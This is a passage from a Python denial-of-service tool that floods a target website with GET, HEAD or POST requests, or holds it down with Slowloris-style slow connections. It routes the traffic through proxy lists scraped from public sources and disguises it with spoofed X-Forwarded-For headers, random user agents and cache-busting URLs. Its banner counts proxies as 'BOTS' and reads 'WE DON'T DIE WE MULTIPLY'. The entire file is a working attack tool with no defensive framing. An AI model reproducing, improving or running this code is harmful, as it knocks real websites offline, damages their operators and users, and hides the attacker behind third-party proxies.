      month = '0' + str(month)
    else:
      month = str(month)
    day = Intn(1, 30)
    if day < 10:
      day = '0' + str(day)
    else:
      day = str(day)
    gecko = year + month + day
    version = str(Intn(1, 72)) + '.0'
    return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
  elif browser == 'ie':
    version = str(Intn(1, 99)) + '.0'
    engine = str(Intn(1, 99)) + '.0'
    option = Choice([True, False])
    if option == True:
      token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
    else:
      token = ''
    return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def randomurl():
  return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))

def GenReqHeader(method):
  global data
  header = ""
  if method == "get" or method == "head":
    connection = "Connection: Keep-Alive\r\n"
    if cookies != "":
      connection += "Cookies: "+str(cookies)+"\r\n"
    accept = Choice(acceptall)
    referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
    connection += "Cache-Control: max-age=0\r\n"
    connection += "pragma: no-cache\r\n"
    connection += "X-Forwarded-For: " + spoofer() + "\r\n"
    useragent = "User-Agent: " + getuseragent() + "\r\n"
    header =  referer + useragent + accept + connection + "\r\n"
  elif method == "post":
    post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
    refer = "Referer: http://"+ target + path + "\r\n"
    user_agent = "User-Agent: " + getuseragent() + "\r\n"
    accept = Choice(acceptall)
    if mode2 != "y":# You can enable customize data
      data = str(random._urandom(16))
    length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
    if cookies != "":
      length += "Cookies: "+str(cookies)+"\r\n"
    header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
  return header

def ParseUrl(original_url):
  global target
  global path
  global port
  global protocol
  original_url = original_url.strip()
  url = ""
  path = "/"#default value
  port = 80 #default value
  protocol = "http"
  #http(s)://www.example.com:1337/xxx
  if original_url[:7] == "http://":
    url = original_url[7:]
  elif original_url[:8] == "https://":
    url = original_url[8:]
    protocol = "https"
  #http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
  #print(url) #for debug
  tmp = url.split("/")
  website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
  check = website.split(":")
  if len(check) != 1:#detect the port
    port = int(check[1])
  else:
    if protocol == "https":
      port = 443
  target = check[0]
  if len(tmp) > 1:
    path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx

def InputOption(question,options,default):
  ans = ""
  while ans == "":
    ans = str(input(question)).strip().lower()
    if ans == "":
      ans = default
    elif ans not in options:
      print("> Please enter the correct option")
      ans = ""
      continue
  return ans

def CheckerOption():
  global proxies
  N = "y"
  if N == 'y' or N == "" :
       downloadsocks(choice)
  else:
       pass
  if choice == "1":
    out_file = "http.txt"
    if out_file == '':
      out_file = str("http.txt")
    else:
      out_file = str(out_file)
    check_list(out_file)
    proxies = open(out_file).readlines()
  elif choice == "5":
    out_file = "socks5.txt"
    if out_file == '':
      out_file = str("socks5.txt")
    else:
      out_file = str(out_file)
    check_list(out_file)
    proxies = open(out_file).readlines()
  if len(proxies) == 0:
    print(color.RED + "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█" + color.END)
    print(color.RED + "█" + color.END + color.BLUE + "                         EMPTY LIST IN PROXIES.TXT                        " + color.END + color.RED + "█" + color.END)
    print(color.RED + "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█" + color.END)
    print('')
    sys.exit(1)
  
  time.sleep(0.03)
  ans = "n"
  if ans == "":
    ans = "y"
  if ans == "y":
    ms = sys.argv[4]
    if ms == "":
      ms = int(5)
    else :
      try:
        ms = int(ms)
      except :
        ms = float(ms)
    check_socks(ms)

def SetupIndDict():
  global ind_dict
  for proxy in proxies:
    ind_dict[proxy.strip()] = 0

def OutputToScreen(ind_rlock):
  global ind_dict
  i = 0
  sp_char = ["|","/","-","\\"]
  while 1:
    if i > 3:
      i = 0
    print("{:^70}".format("Proxies attacking status"))
    print("{:^70}".format("IP:PORT   <->   RPS    "))
    #1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
    ind_rlock.acquire()
    top_num = 0
    top10= sorted(ind_dict, key=ind_dict.get, reverse=True)
    if len(top10) > 10:
      top_num = 10
    else:
      top_num = len(top10)
    for num in range(top_num):
      top = "none"
      rps = 0
      if len(ind_dict) != 0:
        top = top10[num]
        rps = ind_dict[top]
        ind_dict[top] = 0
      print("{:^70}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
    total = 0
    for k,v in ind_dict.items():
      total = total + v
      ind_dict[k] = 0
    ind_rlock.release()
    print("{:^70}".format(" ["+sp_char[i]+"] CC attack | Total Rps:"+str(total)))
    i+=1
    time.sleep(1)
    print("\n"*100)

def pv_raw(event,socks_type,ind_rlock):
  global ind_dict
  header = GenReqHeader("get")
  proxy = Choice(proxies).strip().split(":")
  add = "?"
  if "?" in path:
    add = "&"
  event.wait()
  while True:
    try:
      s = socks.socksocket()
      if socks_type == 1:
        s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
      if socks_type == 5:
        s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
      if brute:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      s.connect((str(target), int(port)))
      if protocol == "https":
        ctx = ssl.SSLContext()
        s = ctx.wrap_socket(s,server_hostname=target)
      try:
        for n in range(multiple+1):
          get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
          request = get_host + header
          sent = s.send(str.encode(request))
          if not sent:
            ind_rlock.acquire()
            ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
            ind_rlock.release()
            proxy = Choice(proxies).strip().split(":")
            break
        s.close()
      
      except:
        s.close()
      ind_rlock.acquire()
      ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
      ind_rlock.release()

    except:
      s.close()

def head(event,socks_type,ind_rlock):#HEAD MODE
  global ind_dict
  header = GenReqHeader("head")
  proxy = Choice(proxies).strip().split(":")
  add = "?"
  if "?" in path:
    add = "&"
  event.wait()
  while True:
    try:
      s = socks.socksocket()
      if socks_type == 1:
        s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
      if socks_type == 5:
        s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
      if brute:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      s.connect((str(target), int(port)))
      if protocol == "https":
        ctx = ssl.SSLContext()
        s = ctx.wrap_socket(s,server_hostname=target)
      try:
        for n in range(multiple+1):
          head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
          request = head_host + header
          sent = s.send(str.encode(request))
          if not sent:
            ind_rlock.acquire()
            ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
            ind_rlock.release()
            proxy = Choice(proxies).strip().split(":")
            break#   This part will jump to dirty fix
        s.close()
      except:
        s.close()
      ind_rlock.acquire()
      ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
      ind_rlock.release()
    except:#dirty fix
      s.close()

def post(event,socks_type,ind_rlock):
  global ind_dict
  request = GenReqHeader("post")
  proxy = Choice(proxies).strip().split(":")
  event.wait()
  while True:
    try:
      s = socks.socksocket()
      if socks_type == 1:
        s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
      if socks_type == 5:
        s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
      if brute:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      s.connect((str(target), int(port)))
      if protocol == "https":
        ctx = ssl.SSLContext()
        s = ctx.wrap_socket(s,server_hostname=target)
      try:
        for n in range(multiple+1):
          sent = s.send(str.encode(request))
          if not sent:
            ind_rlock.acquire()
            ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
            ind_rlock.release()
            proxy = Choice(proxies).strip().split(":")
            break
        s.close()
      except:
        s.close()
      ind_rlock.acquire()
      ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
      ind_rlock.release()
    except:
      s.close()

socket_list=[]
def slow(conn,socks_type):
  proxy = Choice(proxies).strip().split(":")
  for _ in range(conn):
    try:
      s = socks.socksocket()
      if socks_type == 1:
        s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
      if socks_type == 5:
        s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
      s.settimeout(1)
      s.connect((str(target), int(port)))
      if str(port) == '443':
        ctx = ssl.SSLContext()
        s = ctx.wrap_socket(s,server_hostname=target)
      s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
      s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
      s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
      if cookies != "":
        s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
      s.send(("Connection:keep-alive").encode("utf-8"))
      
      socket_list.append(s)
      sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
      sys.stdout.flush()
    except:
      s.close()
      proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
      sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
      sys.stdout.flush()
  while True:
    for s in list(socket_list):
      try:
        s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
        sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
        sys.stdout.flush()
      except:
        s.close()
        socket_list.remove(s)
        sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
        sys.stdout.flush()
    proxy = Choice(proxies).strip().split(":")
    for _ in range(conn - len(socket_list)):
      try:
        if socks_type == 1:
          s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
        if socks_type == 5:
          s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
        s.settimeout(1)
        s.connect((str(target), int(port)))
        if int(port) == 443:
          ctx = ssl.SSLContext()
          s = ctx.wrap_socket(s,server_hostname=target)
        s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
        s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        if cookies != "":
          s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
        s.send(("Connection:keep-alive").encode("utf-8"))
        socket_list.append(s)
        sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
        sys.stdout.flush()
      except:
        proxy = Choice(proxies).strip().split(":")
        sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
        sys.stdout.flush()
        pass
nums = 0
def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
  global nums
  global proxies
  proxy = lines.strip().split(":")
  if len(proxy) != 2:
    rlock.acquire()
    proxies.remove(lines)
    rlock.release()
    return
  err = 0
  while True:
    if err >= 3:
      rlock.acquire()
      proxies.remove(lines)
      rlock.release()
      break
    try:
      s = socks.socksocket()
      if socks_type == 1:
        s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
      if socks_type == 5:
        s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
      s.settimeout(ms)
      s.connect((str(target), int(port)))
      if protocol == "https":
        ctx = ssl.SSLContext()
        s = ctx.wrap_socket(s,server_hostname=target)
      sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
      if not sent:
        err += 1
      s.close()
      break
    except:
      err +=1
  nums += 1

def check_socks(ms):
  global nums
  thread_list=[]
  rlock = threading.RLock()
  for lines in list(proxies):
    if choice == "5":
      th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
      th.start()
    if choice == "1":
      th = threading.Thread(target=checking,args=(lines,1,ms,rlock,))
      th.start()
    thread_list.append(th)
    time.sleep(0.01)
    
  for th in list(thread_list):
    th.join()
    
  
  ans = "y"
  if ans == "y" or ans == "":
    if choice == "1":
      with open("http.txt", 'wb') as fp:
        for lines in list(proxies):
          fp.write(bytes(lines,encoding='utf8'))
      fp.close()
    elif choice == "5":
      with open("socks5.txt", 'wb') as fp:
        for lines in list(proxies):
          fp.write(bytes(lines,encoding='utf8'))
      fp.close()
      
      
def check_list(socks_file):
  
  temp = open(socks_file).readlines()
  temp_list = []
  for i in temp:
    if i not in temp_list:
      if ':' in i:
        temp_list.append(i)
  rfile = open(socks_file, "wb")
  for i in list(temp_list):
    rfile.write(bytes(i,encoding='utf-8'))
  rfile.close()

def downloadsocks(choice):
  if choice == "1":
    f = open("http.txt",'wb')
    try:
        r = requests.get("https://raw.githubusercontent.com/mcburn777/ip5/main/idiots.txt", timeout=5)
        f.write(r.content)
        f.close()
    except:
        f.close()
  if choice == "5":
    f = open("socks5.txt",'wb')
    try:
      r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-socks5.txt",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
      f.write(r.content)
    except:
      pass
    try:
      r = requests.get("https://raw.githubusercontent.com/mcburn777/w0rksocks5/main/socks5.txt",timeout=5)
      f.write(r.content)
      f.close()
    except:
      f.close()
  
def main():
  global multiple
  global choice
  global data
  global mode2
  global cookies
  global brute
  global url
  
  mode = "pv_raw"
  url = sys.argv[1]
  
  ParseUrl(url)
  if mode == "post":
    mode2 = InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
    if mode2 == "y":
      data = open(str(input("> Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
      data = ' '.join([str(txt) for txt in data])
      
  choice2 = "n"
  if choice2 == "y":
    cookies = str(input("Plese input the cookies:")).strip()
  choice = sys.argv[4]
  if choice == "5":
    socks_type = 5
  else:
    socks_type = 1
  if mode == "check":
    CheckerOption()
    print("> End of process")
    return
  if mode == "slow":  
    thread_num = 0
  else:
    thread_num = sys.argv[2]
  if thread_num == "":
    thread_num = int(400)
  else:
    try:
      thread_num = int(thread_num)
    
    except:
      sys.exit("Error thread number")
  

  print(color.RED + "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█" + color.END)
  print(color.RED + "█" + color.END + color.BLUE + "                         ESTABLISHING CONNECTION...                       " + color.END + color.RED + "█" + color.END)
  print(color.RED + "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█" + color.END)
  print('')

  CheckerOption()
  print(color.RED + "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█" + color.END)
  print(color.RED + "█" + color.END + color.BLUE + "                                CONNECTED!                                " + color.END + color.RED + "█" + color.END)
  print(color.RED + "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█" + color.END)
  print('')
  if len(proxies) == 0:
    print(color.RED + "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█" + color.END)
    print(color.RED + "█" + color.END + color.BLUE + "                         EMPTY LIST IN PROXIES.TXT                        " + color.END + color.RED + "█" + color.END)
    print(color.RED + "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█" + color.END)
    print('')
    return
  ind_rlock = threading.RLock()
  if mode == "slow":
    input("Press Enter to continue.")
    th = threading.Thread(target=slow,args=(thread_num,socks_type,))
    th.setDaemon(True)
    th.start()
  else:
    multiple = sys.argv[3]
    if multiple == "":
      multiple = int(100)
    else:
      multiple = int(multiple)
    brute = True
    event = threading.Event()
    os.system('ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear')
    print(color.RED + "       ╔══════════════════════════════════════════════════════╗" + color.END)
    print(color.RED + "       ║                                                      ║" + color.END)
    print(color.RED + "       ║            ░█▀▀█ ▀█▀ ░█▄─░█ ░█▀▀▀█ ░█──░█            ║" + color.END)
    print(color.RED + "       ║            ░█▄▄█ ░█─ ░█░█░█ ░█──░█ ░█▄▄▄█            ║" + color.END)
    print(color.RED + "       ║            ░█─── ▄█▄ ░█──▀█ ░█▄▄▄█ ──░█──            ║" + color.END)
    print(color.RED + "       ║                                                      ║" + color.END)
    print(color.RED + "       ║  ░█──░█ ░█▀▀▀ ░█▄─░█ ░█▀▀▄ ░█▀▀▀ ▀▀█▀▀ ▀▀█▀▀ ─█▀▀█   ║" + color.END)
    print(color.RED + "       ║  ─░█░█─ ░█▀▀▀ ░█░█░█ ░█─░█ ░█▀▀▀ ─░█── ─░█── ░█▄▄█   ║" + color.END)
    print(color.RED + "       ║  ──▀▄▀─ ░█▄▄▄ ░█──▀█ ░█▄▄▀ ░█▄▄▄ ─░█── ─░█── ░█─░█   ║" + color.END)
    print(color.RED + "       ║                                                      ║" + color.END)
    print(color.RED + "       ╚═════╦══════════════════════════════════════════╦═════╝" + color.END)
    print(color.RED + "             ║       ● WE DON'T DIE WE MULTIPLY ●       ║" + color.END)
    print(color.RED + "           ╔═╩══════════════════════════════════════════╩═╗" + color.END)
    print(color.RED + "              ➤ " + color.END + color.RED + color.UNDERLINE + "TARGET" + color.END + color.RED + ":  [{}]".format(url) + color.END)
    print(color.RED + "              ➤ " + color.END + color.RED + color.UNDERLINE + "THREADS" + color.END + color.RED + ": [{}]".format(thread_num) + color.END)
    print(color.RED + "              ➤ " + color.END + color.RED + color.UNDERLINE + "BOTS" + color.END + color.RED + ":    [{}]".format(len(proxies)) + color.END)
    print(color.RED + "              ➤ " + color.END + color.RED + color.UNDERLINE + "METHOD" + color.END + color.RED + ":  [{}]".format(mode) + color.END)
    print(color.RED + "           ╚══════════════════════════════════════════════╝" + color.END)
    print("")
    SetupIndDict()
    build_threads(mode,thread_num,event,socks_type,ind_rlock)
    event.clear()
    
    event.set()
    
  while True:
    try:
      time.sleep(0.1)
    except KeyboardInterrupt:
      break
  

if __name__ == "__main__":
	main()